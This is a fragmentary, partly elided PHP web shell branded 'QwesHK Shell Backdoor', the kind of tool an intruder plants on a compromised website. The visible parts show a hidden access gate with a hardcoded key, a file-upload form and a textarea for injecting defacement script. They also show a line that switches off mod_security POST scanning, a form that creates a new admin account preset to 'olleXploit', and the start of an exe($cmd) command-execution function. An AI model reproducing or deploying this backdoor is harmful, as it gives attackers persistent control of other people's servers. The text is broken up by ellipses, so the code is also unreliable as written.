...
$ollekyun = "914a87113a694c58a5d477fca3312922"; //OXP1337
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='description' content='[ ./QwesHK Shell Backdoor ]'>
    ...
    <title>-=[+] ./QwesHK Shell Backdoor [+]=-</title>
    <style>
    	body{
...
function liat(){ document.getElementById('galiat').style.visibility="visible"; 
  ...
  <body class="text-white">
    <div class="p-3">
    	<h1 class="kabur"> ./Qwes<font color="darkblue">HK</h3></font><hr>
	...
	<hr>
		...
		if($_GET['akses'] == "true") {
		 echo'<form action="" method="post" enctype="multipart/form-data"><h7>
        		      	...
        		      	echo '<h7>Silahkeun Show Opp Ster!<br>';
        		      	...
        		      	?>
    	<center>
    		<small><h7><font color="white">Copyright &copy; </font><a href="http://cysec-0llexsite1307.xp3.biz/INDIHOME/">./QwesHK</h7></a></small>
    	</center>
    </div>
...
<link rel="icon" href="https://i.ibb.co/ysYWZZ9/image.png" type="image/x-icon">
<link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>(+) ./QwesHK Shell (+)</title>
<meta property="og:image" content="https://i.ibb.co/ysYWZZ9/image.png">
<meta name="description" content="[ Powered By ./QwesHK ]" />
<style >
  .blink_text {
-webkit-animation-name: blinker;
...
echo '<center>';
		...
		<input style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' type='text' name='nick' size='50' placeholder='./QwesHK'><br>
...
echo "</td></table></body>";
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
  ...
  <textarea class='oxp_table' name='script' style='width: 450px; height: 200px;'>Touch by ./QwesHK</textarea><br>
...
SecFilterScanPOST Off
    ...
    Username : <input type='text' class='oxp_table' name='user_baru' value='olleXploit'><br>
    Password : <input type='text' class='oxp_table' name='pass_baru' value='olleXploit'><br>
...
echo '<br><center><br/>
<div id="copy">
<font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 20px blue; font-weight:bold: blue; font-size:20px">Copyright &copy; 2k20 </font> <font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 20px blue; font-weight:bold: blue; font-size:20px">./QwesHK</font></div></center>
</body>
</html>';
function exe($cmd) { 	
